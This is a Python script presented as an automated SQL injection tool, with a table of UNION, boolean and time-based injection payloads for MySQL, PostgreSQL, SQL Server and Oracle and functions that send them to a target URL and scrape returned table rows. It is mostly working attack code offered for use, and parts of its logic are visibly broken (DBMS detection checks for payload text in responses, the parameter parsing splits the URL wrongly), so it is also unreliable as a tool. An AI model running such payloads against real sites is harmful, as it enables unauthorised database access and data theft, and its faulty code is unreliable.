# -*- coding: utf-8 -*-

"""
 Union-Based SQL Injection Tool
 Version: Graden
 Author: G4UR4V007
"""

import requests
from bs4 import BeautifulSoup
import argparse
import time

# Define the banner
BANNER = """
  _____               _            
 / ____|             | |           
| |  __  __ _ _ __ __| | ___ _ __  
| | |_ |/ _` | '__/ _` |/ _ \ '_ \ 
| |__| | (_| | | | (_| |  __/ | | |
 \_____|\__,_|_|  \__,_|\___|_| |_|
                                   
                                   
 Automated SQL Injection tool
 Version: 1.0
 Author: G4UR4V007
"""

# Define the supported DBMS
SUPPORTED_DBMS = {
    "MySQL": {
        "UNION": "' UNION SELECT * FROM information_schema.tables --",
        "BOOLEAN": "' OR 1=1 --",
        "TIME": "' OR SLEEP(5) --"
    },
    "PostgreSQL": {
        "UNION": "' UNION SELECT * FROM pg_tables --",
        "BOOLEAN": "' OR 1=1 --",
        "TIME": "' OR pg_sleep(5) --"
    },
    "Microsoft SQL Server": {
        "UNION": "' UNION SELECT * FROM sys.tables --",
        "BOOLEAN": "' OR 1=1 --",
        "TIME": "' OR WAITFOR DELAY '00:00:05' --"
    },
    "Oracle": {
        "UNION": "' UNION SELECT * FROM all_tables --",
        "BOOLEAN": "' OR 1=1 --",
        "TIME": "' OR DBMS_LOCK.SLEEP(5) --"
    }
}

def detect_dbms(url, param):
    for dbms, payloads in SUPPORTED_DBMS.items():
        for technique in payloads.keys():
            print(f"[+] Testing {dbms} with {technique} technique...")
            params = {param: payloads[technique]}
            response = requests.get(url, params=params)
            if "information_schema.tables" in response.text or "pg_tables" in response.text:
                print(f"[+] Detected DBMS: {dbms}")
                return dbms
    print("[-] No supported DBMS detected.")
    return None

def break_url(url):
    # Break the URL using a single quote
    broken_url = url + "'"
    return broken_url

def balance_url(url):
    # Balance the URL by commenting out the remaining part
    balanced_url = url + "#"
    return balanced_url

def test_sqli(url, param, dbms):
    for technique, payload in SUPPORTED_DBMS[dbms].items():
        print(f"[+] Testing for SQL injection with {technique} technique...")
        params = {param: payload}
        response = requests.get(url, params=params)
        if technique == "BOOLEAN":
            if "1=1" in response.text:
                return True
        elif technique == "TIME":
            start_time = time.time()
            requests.get(url, params=params)
            end_time = time.time()
            if end_time - start_time > 5:
                return True
        else:
            if "information_schema.tables" in response.text or "pg_tables" in response.text:
                return True
    return False

def extract_data(url, param, dbms):
    print("[+] Extracting database information...")
    payload = SUPPORTED_DBMS[dbms]["UNION"]
    params = {param: payload}
    response = requests.get(url, params=params)
    soup = BeautifulSoup(response.text, 'html.parser')
    data = []
    
    for row in soup.find_all('tr'):
        cols = row.find_all('td')
        data.append([col.text.strip() for col in cols])
    
    return data

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="SQL Injection Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL with vulnerable parameter")
    args = parser.parse_args()

    # Assume the vulnerable parameter is included in the URL (e.g., http://example.com/vulnerable.php?id=1)
    url = args.url

    # Extract the parameter name from the URL
    param = url.split('=')[0].split('?')[-1]

    # Detect the DBMS
    dbms = detect_dbms(url, param)
    if not dbms:
        return

    # Break the URL using a single quote
    broken_url = break_url(url)

    # Balance the URL by commenting out the remaining part
    balanced_url = broken_url + "-- -"

    # Test for SQL injection vulnerability

    if test_sqli(balanced_url, param, dbms):
        print("[+] SQL injection vulnerability found!")
        data = extract_data(balanced_url, param, dbms)
        print("[+] Data extracted from the database:")
        for row in data:
            print(row)
    else:
        print("[-] No SQL injection vulnerability found.")

if __name__ == "__main__":
    main()
